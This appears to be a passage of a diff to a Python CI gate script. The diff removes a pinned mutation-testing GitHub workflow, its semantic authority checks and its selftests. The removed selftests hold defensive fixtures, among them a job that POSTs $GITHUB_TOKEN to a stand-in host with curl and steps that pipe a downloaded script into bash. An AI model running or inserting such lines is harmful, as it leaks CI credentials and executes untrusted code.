@@ -27,13 +27,12 @@ from repository_ownership import git_toplevel_error, run_git
 VERSION = "1.2.0"
 ROOT = Path(__file__).resolve().parent.parent
 WORKFLOW = ROOT / ".github/workflows/check.yml"
-MUTATION_WORKFLOW = ROOT / ".github/workflows/mutation-proof.yml"
 WORKFLOW_DIR = ROOT / ".github/workflows"
 # The contract pinned one file byte-for-byte and nothing enumerated the directory, so a
 # SECOND workflow -- `permissions: write-all`, `pull_request_target`, arbitrary steps --
 # ran on every push with the gate reporting the workflow contract satisfied. A CI
 # configuration is the set of files, not the one file we happen to name.
-EXPECTED_WORKFLOW_FILES = ("check.yml", "mutation-proof.yml")
+EXPECTED_WORKFLOW_FILES = ("check.yml",)
 # Every selftest suite carries a numeric floor; the eval corpus was floored only at zero,
 # so cutting 25 scenarios across 7 skills down to a single semantically empty one leaves the
 # whole gate green. Lower these in the commit that removes the scenarios.
@@ -163,133 +162,6 @@ jobs:
       - name: pinned upstream conformance
         run: python3 tools/portable-conformance.py
 """
-EXPECTED_MUTATION_WORKFLOW = """name: mutation-proof
-# The sweep measures whether the shipped suites catch every planned guard mutation at this
-# exact head, and holds that measurement against the reviewed policy in
-# contracts/mutation-policy.json. The measurement is this run's evidence and is never
-# committed: the offline gate can validate the policy, but only a sweep can measure.
-#
-# Every accepted head is measured afresh by the same fifteen shards. A path filter, selector or
-# inherited result would leave the verdict dependent on unverified prior workflow and runner
-# state; absence and self-consistency are not measurement evidence. A pull-request run is
-# cancelled only when a newer run of the same pull request supersedes it. Each push and
-# dispatch run is its own concurrency group, because GitHub replaces a pending run in a shared
-# group whatever cancel-in-progress says, and no other run can cancel or replace one of them.
-on:
-  pull_request:
-  push:
-    branches: [main]
-  workflow_dispatch:
-
-permissions:
-  contents: read
-
-concurrency:
-  group: mutation-proof-${{ github.event.pull_request.number || github.run_id }}
-  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
-
-jobs:
-  mutations:
-    strategy:
-      fail-fast: false
-      matrix:
-        shard: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
-    runs-on: ubuntu-24.04
-    timeout-minutes: 90
-    steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-        with:
-          persist-credentials: false
-          ref: ${{ github.event.pull_request.head.sha || github.sha }}
-      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97
-        with:
-          python-version: 3.13.14
-      - name: install zsh and assert the exact accepted head
-        timeout-minutes: 10
-        run: |
-          # A stalled mirror does not fail, it hangs: `update` sat on one InRelease fetch
-          # until the step budget killed it, so `|| true` never fired -- that guards against
-          # a non-zero exit, not against never exiting. Each refresh is bounded instead, and
-          # is advisory because the runner image ships package lists an install can already
-          # satisfy. `zsh --version` remains the assertion: an absent interpreter still fails
-          # this step, so resilience is not bought with coverage.
-          # No backslash continuations here: this file is pinned byte-for-byte inside a
-          # Python string literal, where a trailing backslash is a line continuation and
-          # would collapse, so the pin could never match the file.
-          APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"
-          for attempt in 1 2 3; do
-            sudo timeout 120 apt-get update $APT_OPTS || true
-            sudo apt-get install -y zsh && break
-            echo "apt attempt $attempt did not yield zsh; retrying"
-            sleep 10
-          done
-          zsh --version
-          git rev-parse HEAD | grep -Fx '${{ github.event.pull_request.head.sha || github.sha }}'
-      - name: run mutation shard
-        run: >-
-          python3 tools/write-mutation-receipt.py
-          --shard-index ${{ matrix.shard }}
-          --shard-count 15
-          --fragment mutation-fragment-${{ matrix.shard }}.json
-          --expected-head '${{ github.event.pull_request.head.sha || github.sha }}'
-      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
-        with:
-          name: mutation-fragment-${{ matrix.shard }}
-          path: mutation-fragment-${{ matrix.shard }}.json
-          if-no-files-found: error
-          retention-days: 90
-
-  aggregate:
-    if: always()
-    needs: mutations
-    runs-on: ubuntu-24.04
-    timeout-minutes: 30
-    steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-        with:
-          persist-credentials: false
-          ref: ${{ github.event.pull_request.head.sha || github.sha }}
-      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97
-        with:
-          python-version: 3.13.14
-      - name: install zsh and assert the exact accepted head
-        timeout-minutes: 10
-        run: |
-          # A stalled mirror does not fail, it hangs: `update` sat on one InRelease fetch
-          # until the step budget killed it, so `|| true` never fired -- that guards against
-          # a non-zero exit, not against never exiting. Each refresh is bounded instead, and
-          # is advisory because the runner image ships package lists an install can already
-          # satisfy. `zsh --version` remains the assertion: an absent interpreter still fails
-          # this step, so resilience is not bought with coverage.
-          # No backslash continuations here: this file is pinned byte-for-byte inside a
-          # Python string literal, where a trailing backslash is a line continuation and
-          # would collapse, so the pin could never match the file.
-          APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"
-          for attempt in 1 2 3; do
-            sudo timeout 120 apt-get update $APT_OPTS || true
-            sudo apt-get install -y zsh && break
-            echo "apt attempt $attempt did not yield zsh; retrying"
-            sleep 10
-          done
-          zsh --version
-          git rev-parse HEAD | grep -Fx '${{ github.event.pull_request.head.sha || github.sha }}'
-      - name: refuse a head whose shards did not all succeed
-        if: needs.mutations.result != 'success'
-        run: |
-          echo "mutations result: ${{ needs.mutations.result }}"
-          exit 1
-      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093
-        with:
-          pattern: mutation-fragment-*
-          path: mutation-fragments
-          merge-multiple: true
-      - name: reject incomplete evidence and enforce the mutation policy
-        run: >-
-          python3 tools/write-mutation-receipt.py
-          --aggregate mutation-fragments/*.json
-"""
-
-
 @dataclass(frozen=True)
 class Result:
     returncode: int
@@ -366,21 +238,13 @@ def validate_receipt(result: Result, spec: ReceiptSpec) -> Optional[str]:
     return spec.validate(matches[0], result.returncode)
 
 
-def workflow_error(data: str, mutation_data: Optional[str] = None) -> Optional[str]:
-    if mutation_data is None:
-        mutation_data = EXPECTED_MUTATION_WORKFLOW
+def workflow_error(data: str) -> Optional[str]:
     if data != EXPECTED_WORKFLOW:
         return (
             "workflow differs from the closed contract: two explicit OS targets, Python "
             "3.13.14, full action SHAs, read-only permissions, non-persisted checkout "
             "credentials, a Linux-only zsh install whose own version call proves it "
             "landed, one ci-gate command, and one conformance command"
-        )
-    if mutation_data != EXPECTED_MUTATION_WORKFLOW:
-        return (
-            "mutation workflow differs from the closed contract: every accepted head "
-            "runs fifteen deterministic shards at the exact head, with read-only permissions, "
-            "immutable actions, artifact aggregation, and enforcement of the reviewed policy"
         )
     return None
 
@@ -420,23 +284,6 @@ def _yaml_step_headers(block: str) -> list[str]:
         and len(line) - len(line.lstrip(" ")) == 6
         and (line.strip() == "-" or line.strip().startswith("- "))
     ]
-
-
-def _folded_command(step: str) -> tuple[str, ...]:
-    """Return every line of a folded `run: >-` block, comments included.
-
-    YAML recognises no comment inside a block scalar, so a `#`-leading line there is
-    content: folding joins it to the command with a space and the shell then treats the
-    whole folded line as a comment. Dropping those lines the way a literal `run: |` block
-    allows -- where `#` really is a shell comment -- let one inserted line turn the sweep's
-    aggregate into a no-op that exits zero while this oracle read the command it
-    expected. Every line is returned, so an inserted one changes the tuple and is refused.
-    """
-    return tuple(
-        line.strip()
-        for line in _yaml_mapping_block(step, "        run: >-").splitlines()[1:]
-        if line.strip()
-    )
 
 
 def _yaml_run_commands(step: str) -> tuple[str, ...]:
@@ -527,183 +374,6 @@ def sibling_workflow_jobs_error(data: str) -> str:
     if _yaml_fields(portable_run, 8) != [
             "run: python3 tools/portable-conformance.py"]:
         return "portable-conformance command is not exactly the reviewed executable"
-    return ""
-
-
-def mutation_workflow_authority_error(data: str) -> str:
-    """Independently close the sweep workflow's authority, jobs, steps, and commands.
-
-    The only authority this workflow carried was a byte comparison against a constant in this
-    file, so three coordinated edits -- the workflow, that constant, and the tracked source
-    digest -- moved together and left the whole gate green while a widened token, an appended
-    job, an inserted step, or a changed shard count reached the runner. Nothing below reads
-    that constant: an oracle that consults the bytes it exists to second-guess repeats them.
-    """
-    checkout = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-    setup = "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97"
-    upload = "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02"
-    download = "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093"
-    head = "${{ github.event.pull_request.head.sha || github.sha }}"
-
-    top_fields = [
-        line.strip()
-        for line in data.splitlines()
-        if line.strip() and not line.lstrip().startswith("#")
-        and len(line) - len(line.lstrip(" ")) == 0
-    ]
-    if top_fields != ["name: mutation-proof", "on:", "permissions:", "concurrency:", "jobs:"]:
-        return "mutation workflow top-level fields permit an unreviewed environment"
-    # Cancelling a superseded pull-request run is safe because the run superseding it
-    # measures that pull request's current head. Push and dispatch runs are keyed by run, not
-    # by head: GitHub replaces a pending run in a shared group even without
-    # cancel-in-progress, so any key two of those runs could share would let one leave an
-    # accepted head with no measurement.
-    if _yaml_fields(_yaml_mapping_block(data, "concurrency:"), 2) != [
-            "group: mutation-proof-${{ github.event.pull_request.number || github.run_id }}",
-            "cancel-in-progress: ${{ github.event_name == 'pull_request' }}"]:
-        return ("mutation workflow concurrency is not exactly per pull request and per run, "
-                "with pull-request-only cancellation")
-    # The key alone leaves the block's CONTENT unread, and neither job overrides it, so a
-    # widened workflow-level token reaches every shard and the aggregator silently.
-    granted = [
-        line.strip()
-        for line in _yaml_mapping_block(data, "permissions:").splitlines()[1:]
-        if line.strip() and not line.lstrip().startswith("#")
-    ]
-    if granted != ["contents: read"]:
-        return "mutation workflow top-level permissions are not exactly contents:read"
-    trigger = _yaml_mapping_block(data, "on:")
-    if _yaml_fields(trigger, 2) != ["pull_request:", "push:", "workflow_dispatch:"]:
-        return "mutation workflow trigger inventory is not exactly the three reviewed events"
-    if _yaml_fields(_yaml_mapping_block(trigger, "  push:"), 4) != ["branches: [main]"]:
-        return "mutation workflow push trigger is not exactly main"
-    # A selector on either unfiltered event silences the sweep for the heads it excludes, and
-    # the absence of a measurement is not a measurement.
-    for event in ("  pull_request:", "  workflow_dispatch:"):
-        if any(line.strip()
-               for line in _yaml_mapping_block(trigger, event).splitlines()[1:]):
-            return f"mutation workflow {event.strip(' :')} trigger is filtered"
-
-    # Both job lookups precede the inventory so a duplicated job keeps its own diagnosis
-    # instead of being answered by the inventory.
-    shard = _yaml_mapping_block(data, "  mutations:")
-    if not shard:
-        return "mutation shard job is absent or duplicated"
-    aggregate = _yaml_mapping_block(data, "  aggregate:")
-    if not aggregate:
-        return "mutation aggregate job is absent or duplicated"
-    # The jobs mapping is append-open to every closed list built below, because those cover
-    # one named block each and never the mapping that may carry a third sibling.
-    jobs = _yaml_mapping_block(data, "jobs:")
-    job_names = [
-        line.strip()
-        for line in jobs.splitlines()[1:]
-        if line.strip() and not line.lstrip().startswith("#")
-        and len(line) - len(line.lstrip(" ")) == 2
-    ]
-    if job_names != ["mutations:", "aggregate:"]:
-        return "mutation workflow job inventory is not exactly closed"
-
-    if _yaml_fields(shard, 4) != [
-            "strategy:", "runs-on: ubuntu-24.04", "timeout-minutes: 90", "steps:"]:
-        return "mutation shard job fields are not exactly the closed contract"
-    strategy = _yaml_mapping_block(shard, "    strategy:")
-    if _yaml_fields(strategy, 6) != ["fail-fast: false", "matrix:"]:
-        return "mutation shard strategy is not exactly fail-fast with one matrix"
-    matrix = _yaml_mapping_block(strategy, "      matrix:")
-    if _yaml_fields(matrix, 8) != [
-            "shard: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]"]:
-        return "mutation shard matrix is not exactly the fifteen reviewed shards"
-    if _yaml_step_headers(shard) != [
-            f"- uses: {checkout}", f"- uses: {setup}",
-            "- name: install zsh and assert the exact accepted head",
-            "- name: run mutation shard", f"- uses: {upload}"]:
-        return "mutation shard step inventory is not exactly ordered and closed"
-    if _yaml_fields(aggregate, 4) != [
-            "if: always()", "needs: mutations", "runs-on: ubuntu-24.04",
-            "timeout-minutes: 30", "steps:"]:
-        return "mutation aggregate job fields are not exactly the closed contract"
-    if _yaml_step_headers(aggregate) != [
-            f"- uses: {checkout}", f"- uses: {setup}",
-            "- name: install zsh and assert the exact accepted head",
-            "- name: refuse a head whose shards did not all succeed",
-            f"- uses: {download}",
-            "- name: reject incomplete evidence and enforce the mutation policy"]:
-        return "mutation aggregate step inventory is not exactly ordered and closed"
-
-    for label, job in (("shard", shard), ("aggregate", aggregate)):
-        checkout_step = _yaml_mapping_block(job, f"      - uses: {checkout}")
-        checkout_with = _yaml_mapping_block(checkout_step, "        with:")
-        if (_yaml_fields(checkout_step, 8) != ["with:"]
-                or _yaml_fields(checkout_with, 10) != [
-                    "persist-credentials: false", f"ref: {head}"]):
-            return (f"mutation {label} checkout step is not exactly non-persisting at the "
-                    "accepted head")
-        setup_step = _yaml_mapping_block(job, f"      - uses: {setup}")
-        setup_with = _yaml_mapping_block(setup_step, "        with:")
-        if (_yaml_fields(setup_step, 8) != ["with:"]
-                or _yaml_fields(setup_with, 10) != ["python-version: 3.13.14"]):
-            return f"mutation {label} setup-python step is not exactly unconditional"
-        zsh_step = _yaml_mapping_block(
-            job, "      - name: install zsh and assert the exact accepted head")
-        if _yaml_fields(zsh_step, 8) != ["timeout-minutes: 10", "run: |"]:
-            return f"mutation {label} zsh step fields are not exactly bounded"
-        if _yaml_run_commands(zsh_step) != (
-                'APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"',
-                "for attempt in 1 2 3; do",
-                "sudo timeout 120 apt-get update $APT_OPTS || true",
-                "sudo apt-get install -y zsh && break",
-                'echo "apt attempt $attempt did not yield zsh; retrying"',
-                "sleep 10", "done", "zsh --version",
-                f"git rev-parse HEAD | grep -Fx '{head}'"):
-            return (f"mutation {label} zsh command sequence is not exactly bounded and "
-                    "head-asserted")
-
-    receipt_step = _yaml_mapping_block(shard, "      - name: run mutation shard")
-    if _yaml_fields(receipt_step, 8) != ["run: >-"]:
-        return "mutation shard receipt step fields are not exactly one folded command"
-    receipt_command = _folded_command(receipt_step)
-    if receipt_command != (
-            "python3 tools/write-mutation-receipt.py",
-            "--shard-index ${{ matrix.shard }}",
-            "--shard-count 15",
-            "--fragment mutation-fragment-${{ matrix.shard }}.json",
-            f"--expected-head '{head}'"):
-        return "mutation shard receipt command is not exactly the fifteen-way sharded writer"
-    upload_step = _yaml_mapping_block(shard, f"      - uses: {upload}")
-    upload_with = _yaml_mapping_block(upload_step, "        with:")
-    if (_yaml_fields(upload_step, 8) != ["with:"]
-            or _yaml_fields(upload_with, 10) != [
-                "name: mutation-fragment-${{ matrix.shard }}",
-                "path: mutation-fragment-${{ matrix.shard }}.json",
-                "if-no-files-found: error", "retention-days: 90"]):
-        return "mutation shard fragment upload is not exactly the reviewed evidence upload"
-
-    refusal_step = _yaml_mapping_block(
-        aggregate, "      - name: refuse a head whose shards did not all succeed")
-    if _yaml_fields(refusal_step, 8) != [
-            "if: needs.mutations.result != 'success'", "run: |"]:
-        return "mutation aggregate shard-failure gate fields are not the closed refusal"
-    if _yaml_run_commands(refusal_step) != (
-            'echo "mutations result: ${{ needs.mutations.result }}"', "exit 1"):
-        return "mutation aggregate shard-failure gate does not exit non-zero"
-    download_step = _yaml_mapping_block(aggregate, f"      - uses: {download}")
-    download_with = _yaml_mapping_block(download_step, "        with:")
-    if (_yaml_fields(download_step, 8) != ["with:"]
-            or _yaml_fields(download_with, 10) != [
-                "pattern: mutation-fragment-*", "path: mutation-fragments",
-                "merge-multiple: true"]):
-        return "mutation aggregate fragment download is not exactly the reviewed pattern"
-    comparison_step = _yaml_mapping_block(
-        aggregate,
-        "      - name: reject incomplete evidence and enforce the mutation policy")
-    if _yaml_fields(comparison_step, 8) != ["run: >-"]:
-        return "mutation aggregate comparison step fields are not one folded command"
-    comparison_command = _folded_command(comparison_step)
-    if comparison_command != (
-            "python3 tools/write-mutation-receipt.py",
-            "--aggregate mutation-fragments/*.json"):
-        return "mutation aggregate policy command is not the reviewed aggregation"
     return ""
 
 
@@ -2220,6 +1890,7 @@ REGISTERED_REVIEW_PATHS = frozenset({
     "pr-29/frozen-publication.json",
     "pr-30/frozen-publication.json",
     "pr-36/frozen-publication.json",
+    "pr-41/frozen-publication.json",
 })
 HANDOFF_DOCTRINE = {
     "AGENTS.md": (
@@ -2867,11 +2538,7 @@ def gate(
 ) -> int:
     failures: List[str] = []
     workflow = WORKFLOW.read_text(encoding="utf-8") if WORKFLOW.is_file() else ""
-    mutation_workflow = (
-        MUTATION_WORKFLOW.read_text(encoding="utf-8")
-        if MUTATION_WORKFLOW.is_file() else ""
-    )
-    problem = workflow_error(workflow, mutation_workflow)
+    problem = workflow_error(workflow)
     print(f"  {'FAIL' if problem else 'PASS'} workflow-contract")
     if problem:
         failures.append(problem)
@@ -2882,13 +2549,6 @@ def gate(
     )
     if publication_workflow_problem:
         failures.append(publication_workflow_problem)
-    mutation_authority_problem = mutation_workflow_authority_error(mutation_workflow)
-    print(
-        f"  {'FAIL' if mutation_authority_problem else 'PASS'} "
-        "mutation-workflow-authority-contract"
-    )
-    if mutation_authority_problem:
-        failures.append(mutation_authority_problem)
     present = (
         tuple(sorted(p.name for p in WORKFLOW_DIR.iterdir() if p.is_file()))
         if WORKFLOW_DIR.is_dir() else ()
@@ -2931,8 +2591,9 @@ def gate(
         print(f"  {'FAIL' if mutation_problem else 'PASS'} {check_name}")
         if mutation_problem:
             failures.append(mutation_problem)
-    # Measurements live in the exact-head mutation-proof run, not in the tree; what the
-    # offline gate can state is the reviewed policy it will be held against.
+    # Measurements come from a sweep run by hand with tools/write-mutation-receipt.py, never
+    # from the tree; what the offline gate can state is the reviewed policy a sweep is held
+    # against.
     try:
         _policy = _unique_json(MUTATION_POLICY.read_bytes())
         _classes = [entry.get("class") for entry in _policy.get("allowed_survivors", [])]
@@ -3383,355 +3044,6 @@ def selftest() -> int:
                 and call[-1].startswith(decision_writer.BASE + ":")
                 for call in topology_calls),
     )
-    expect(
-        "mutation workflow baseline matches exact contract",
-        workflow_error(EXPECTED_WORKFLOW, EXPECTED_MUTATION_WORKFLOW) is None,
-    )
-    expect(
-        "mutation workflow rejects a merge-ref checkout",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace(
-                "          ref: ${{ github.event.pull_request.head.sha "
-                "|| github.sha }}\n", "", 1),
-        ) is not None,
-    )
-    # The sweep is the only check that measures at all; the offline gate validates only the
-    # policy it is held against, so every accepted head must execute all fifteen shards. A
-    # selector or job-level condition would make the result depend on an unproved base run
-    # and mutable runner state.
-    expect(
-        "mutation workflow carries no path filter that would silence a head",
-        "paths:" not in EXPECTED_MUTATION_WORKFLOW
-        and "paths-ignore:" not in EXPECTED_MUTATION_WORKFLOW,
-    )
-    expect(
-        "a path-ignore selector over runtime inputs is rejected",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace(
-                "  pull_request:\n",
-                "  pull_request:\n"
-                "    paths-ignore: [settings.json, hooks/hooks.json]\n",
-                1),
-        ) is not None,
-    )
-    expect(
-        "mutation shards cannot gain a job-level selector",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace(
-                "  mutations:\n", "  mutations:\n    if: false\n", 1),
-        ) is not None,
-    )
-    expect(
-        "mutation workflow retains all fifteen shards",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace(
-                "        shard: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]\n",
-                "        shard: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]\n", 1),
-        ) is not None,
-    )
-    expect(
-        "shard commands retain the fifteen-way assignment",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace("--shard-count 15", "--shard-count 14", 1),
-        ) is not None,
-    )
-    expect(
-        "shard commands retain the exact-head fence",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace(
-                "          --expected-head '${{ github.event.pull_request.head.sha "
-                "|| github.sha }}'\n", "", 1),
-        ) is not None,
-    )
-    expect(
-        "mutation workflow binds its head on every event it accepts",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace("|| github.sha ", "", 1),
-        ) is not None,
-    )
-    expect(
-        "mutation aggregator must run even when a shard fails",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace("    if: always()\n", "", 1),
-        ) is not None,
-    )
-    expect(
-        "mutation aggregate depends on the shards",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace("    needs: mutations\n", "", 1),
-        ) is not None,
-    )
-    expect(
-        "a head whose shards did not all succeed is refused",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace(
-                "        if: needs.mutations.result != 'success'\n", "", 1),
-        ) is not None,
-    )
-    expect(
-        "fragment upload fails when a shard writes no evidence",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace("          if-no-files-found: error\n", "", 1),
-        ) is not None,
-    )
-    expect(
-        "aggregate retains artifact download",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace(
-                "      - uses: actions/download-artifact@"
-                "d3f86a106a0bac45b974a628896c90dbdf5c8093\n", "", 1),
-        ) is not None,
-    )
-    expect(
-        "aggregate retains policy enforcement",
-        workflow_error(
-            EXPECTED_WORKFLOW,
-            EXPECTED_MUTATION_WORKFLOW.replace(
-                "          --aggregate mutation-fragments/*.json\n", "", 1),
-        ) is not None,
-    )
-    expect(
-        "mutation workflow has no inheritance or scope-selector mode",
-        all(term not in EXPECTED_MUTATION_WORKFLOW for term in (
-            "resweep", "verify-inherited", "needs.scope", "scope:")),
-    )
-    expect(
-        "mutation workflow authority baseline matches its independent semantic contract",
-        mutation_workflow_authority_error(EXPECTED_MUTATION_WORKFLOW) == "",
-    )
-
-    def coordinated_sweep_mutation(mutated, diagnosis, *, exact=False):
-        """Move the byte oracle with a changed sweep workflow; authority must still red."""
-        original = EXPECTED_MUTATION_WORKFLOW
-        globals()["EXPECTED_MUTATION_WORKFLOW"] = mutated
-        try:
-            problem = mutation_workflow_authority_error(mutated)
-            return (mutated != original
-                    and workflow_error(EXPECTED_WORKFLOW, mutated) is None
-                    and (problem == diagnosis if exact else diagnosis in problem))
-        finally:
-            globals()["EXPECTED_MUTATION_WORKFLOW"] = original
-
-    def sweep_replacement(old, new):
-        """Return the sweep workflow with one uniquely located edit, else an unchanged copy."""
-        if EXPECTED_MUTATION_WORKFLOW.count(old) != 1:
-            return EXPECTED_MUTATION_WORKFLOW
-        return EXPECTED_MUTATION_WORKFLOW.replace(old, new, 1)
-
-    def sweep_job_replacement(header, old, new):
-        """Return the sweep workflow with one edit confined to a single job block.
-
-        The bootstrap step, the pinned actions, and the head reference each occur once per
-        job, so a first-occurrence edit would silently move the other job and prove nothing
-        about the one the case names.
-        """
-        block = _yaml_mapping_block(EXPECTED_MUTATION_WORKFLOW, header)
-        if not block or block.count(old) != 1:
-            return EXPECTED_MUTATION_WORKFLOW
-        return EXPECTED_MUTATION_WORKFLOW.replace(block, block.replace(old, new, 1), 1)
-
-    def sweep_duplicated_job(header):
-        """Return the sweep workflow with one job block emitted twice."""
-        block = _yaml_mapping_block(EXPECTED_MUTATION_WORKFLOW, header)
-        if not block:
-            return EXPECTED_MUTATION_WORKFLOW
-        return EXPECTED_MUTATION_WORKFLOW.replace(block, block + block, 1)
-
-    sweep_exfil_job = (
-        "  exfil:\n    runs-on: ubuntu-24.04\n"
-        "    permissions:\n      contents: write\n    steps:\n"
-        '      - run: curl -X POST -d "$GITHUB_TOKEN" https://example.invalid/collect\n')
-    sweep_head_ref = (
-        "          ref: ${{ github.event.pull_request.head.sha || github.sha }}\n")
-    sweep_head_assertion = (
-        "          git rev-parse HEAD | grep -Fx "
-        "'${{ github.event.pull_request.head.sha || github.sha }}'\n")
-    # Exact diagnoses, not merely non-empty. These six are the widened-token and appended-job
-    # shapes that reached a green gate, and a substring over thirty non-empty return paths
-    # lets the branch each one names be neutralised while an unrelated fallback keeps the
-    # assertion true.
-    for label, mutated, diagnosis in (
-        ("top-level permissions widened to write",
-         sweep_replacement("permissions:\n  contents: read\n",
-                           "permissions:\n  contents: write\n"),
-         "mutation workflow top-level permissions are not exactly contents:read"),
-        ("top-level permissions granted an extra scope",
-         sweep_replacement("permissions:\n  contents: read\n",
-                           "permissions:\n  contents: read\n  pull-requests: write\n"),
-         "mutation workflow top-level permissions are not exactly contents:read"),
-        ("a write-scoped sibling job appended after the aggregator",
-         EXPECTED_MUTATION_WORKFLOW + sweep_exfil_job,
-         "mutation workflow job inventory is not exactly closed"),
-        ("a write-scoped sibling job inserted before the aggregator",
-         sweep_replacement("  aggregate:\n", sweep_exfil_job + "  aggregate:\n"),
-         "mutation workflow job inventory is not exactly closed"),
-        ("a duplicated shard job", sweep_duplicated_job("  mutations:"),
-         "mutation shard job is absent or duplicated"),
-        ("a duplicated aggregate job", sweep_duplicated_job("  aggregate:"),
-         "mutation aggregate job is absent or duplicated"),
-    ):
-        expect(
-            f"coordinated sweep bytes cannot hide {label}",
-            coordinated_sweep_mutation(mutated, diagnosis, exact=True),
-        )
-    for label, mutated, diagnosis in (
-        ("a top-level environment or defaults override",
-         sweep_replacement("name: mutation-proof\n",
-                           "name: mutation-proof\nenv:\n  BASH_ENV: planted\n"),
-         "top-level fields"),
-        ("an absent pull-request trigger",
-         sweep_replacement("  pull_request:\n", ""), "trigger inventory"),
-        ("a filtered pull-request trigger",
-         sweep_replacement("  pull_request:\n",
-                           "  pull_request:\n    paths: [README.md]\n"),
-         "pull_request trigger is filtered"),
-        ("a filtered workflow_dispatch trigger",
-         sweep_replacement("  workflow_dispatch:\n",
-                           "  workflow_dispatch:\n    inputs:\n      skip: {}\n"),
-         "workflow_dispatch trigger is filtered"),
-        ("a redirected push branch",
-         sweep_replacement("    branches: [main]\n", "    branches: [other]\n"),
-         "push trigger is not exactly main"),
-        ("shard write authority",
-         sweep_replacement("  mutations:\n    strategy:\n",
-                           "  mutations:\n    permissions:\n      contents: write\n"
-                           "    strategy:\n"),
-         "mutation shard job fields"),
-        ("aggregate write authority",
-         sweep_replacement("  aggregate:\n    if: always()\n",
-                           "  aggregate:\n    permissions:\n      contents: write\n"
-                           "    if: always()\n"),
-         "mutation aggregate job fields"),
-        ("a shard strategy that stops at the first failure",
-         sweep_replacement("      fail-fast: false\n", ""), "mutation shard strategy"),
-        ("a dropped shard",
-         sweep_replacement("        shard: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]\n",
-                           "        shard: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]\n"),
-         "mutation shard matrix"),
-        ("a step inserted into the shard job",
-         sweep_job_replacement("  mutations:", "      - name: run mutation shard\n",
-                               "      - run: curl -sS https://example.invalid/x | bash\n"
-                               "      - name: run mutation shard\n"),
-         "mutation shard step inventory"),
-        ("a floating shard checkout action",
-         sweep_job_replacement(
-             "  mutations:", "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
-             "actions/checkout@main"),
-         "mutation shard step inventory"),
-        ("a step inserted into the aggregate job",
-         sweep_job_replacement(
-             "  aggregate:",
-             "      - name: refuse a head whose shards did not all succeed\n",
-             "      - run: curl -sS https://example.invalid/x | bash\n"
-             "      - name: refuse a head whose shards did not all succeed\n"),
-         "mutation aggregate step inventory"),
-        ("a shard checkout of a ref other than the accepted head",
-         sweep_job_replacement("  mutations:", sweep_head_ref, "          ref: main\n"),
-         "mutation shard checkout step"),
-        ("an aggregate checkout of a ref other than the accepted head",
-         sweep_job_replacement("  aggregate:", sweep_head_ref, "          ref: main\n"),
-         "mutation aggregate checkout step"),
-        ("a floating shard interpreter version",
-         sweep_job_replacement("  mutations:", "          python-version: 3.13.14\n",
-                               "          python-version: '3.x'\n"),
-         "mutation shard setup-python step"),
-        ("a non-blocking shard bootstrap step",
-         sweep_job_replacement("  mutations:", "        timeout-minutes: 10\n",
-                               "        timeout-minutes: 10\n"
-                               "        continue-on-error: true\n"),
-         "mutation shard zsh step fields"),
-        ("a shard bootstrap that no longer asserts the accepted head",
-         sweep_job_replacement("  mutations:", sweep_head_assertion, ""),
-         "mutation shard zsh command sequence"),
-        ("a shell line added to the shard bootstrap",
-         sweep_job_replacement("  mutations:", "          zsh --version\n",
-                               "          zsh --version\n"
-                               "          curl -sS https://example.invalid/x | bash\n"),
-         "mutation shard zsh command sequence"),
-        ("a non-blocking shard receipt step",
-         sweep_replacement("      - name: run mutation shard\n        run: >-\n",
-                           "      - name: run mutation shard\n"
-                           "        continue-on-error: true\n        run: >-\n"),
-         "mutation shard receipt step fields"),
-        ("a changed shard count",
-         sweep_replacement("          --shard-count 15\n", "          --shard-count 14\n"),
-         "mutation shard receipt command"),
-        ("a shard that uploads no evidence",
-         sweep_replacement("          if-no-files-found: error\n", ""),
-         "mutation shard fragment upload"),
-        ("an aggregator that no longer refuses a failed shard",
-         sweep_replacement("        if: needs.mutations.result != 'success'\n", ""),
-         "mutation aggregate shard-failure gate fields"),
-        ("a shard-failure refusal that exits zero",
-         sweep_job_replacement("  aggregate:", "          exit 1\n",
